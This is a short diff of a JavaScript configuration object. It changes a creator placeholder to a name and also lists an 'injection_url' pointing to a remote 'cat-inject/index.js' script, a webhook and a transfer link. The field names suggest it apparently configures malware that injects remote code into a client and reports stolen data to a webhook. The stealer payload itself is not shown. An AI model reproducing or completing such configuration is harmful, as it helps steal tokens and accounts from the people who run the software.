@@ -17,7 +17,7 @@ var config = {
     "init-notify": "true",
     "embed-color": 4873726,
 
-    creator: "%NAME_CREATOR%",
+    creator: "TrumpingJack",
     transfer_link: `%TRANSFER_URL%`,
     injection_url: "https://raw.githubusercontent.com/fuzzlesfixer/Assets/main/cat-inject/index.js",
     webhook: "%WEBHOOK%",
